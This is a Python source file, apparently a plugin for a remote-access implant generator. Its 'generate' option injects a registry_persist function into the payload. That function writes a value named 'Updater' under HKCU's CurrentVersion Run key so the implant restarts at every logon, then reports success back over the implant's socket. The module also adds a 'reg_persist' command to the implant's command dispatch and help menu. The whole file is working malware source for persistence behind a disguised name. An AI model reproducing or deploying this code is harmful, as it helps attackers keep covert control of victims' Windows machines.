# API
# done


def main(self, option):
    if option == 'generate':
        self.config.import_statements.append('import winreg')
        self.config.import_statements.append('from sys import argv')
        self.config.import_statements.append('from os import getcwd, path')
        self.config.functions.append('''
def registry_persist(path):
    reg = winreg.ConnectRegistry(None,winreg.HKEY_CURRENT_USER)
    key = winreg.CreateKeyEx(reg,'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,winreg.KEY_WRITE)
    winreg.SetValueEx(key, 'Updater',0,winreg.REG_SZ, path)
    winreg.FlushKey(key)
    winreg.CloseKey(key)
    winreg.CloseKey(reg)
    send_all(s,'[+]Persistence via registry achieved')''')
        self.config.logics.append('''
            elif command == "reg_persist":
                registry_persist(path.join(getcwd(),path.abspath(argv[0])))''')
        self.config.help_menu[
            'reg_persist'] = 'This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path'
    elif option == 'info':
        self.log.blank('\nName             : Registry Persistence component' \
                       '\nOS               : Windows' \
                       '\nRequired Modules : winreg, sys, os' \
                       '\nCommands         : reg_persist' \
                       '\nDescription      : This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path')
        return {
                "Name": "Registry Persistence component",
                "OS": "Windows",
                "Required Modules": "winreg, sys, os",
                "Commands": "reg_persist",
                "Description": "This module creates a new key in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry path"}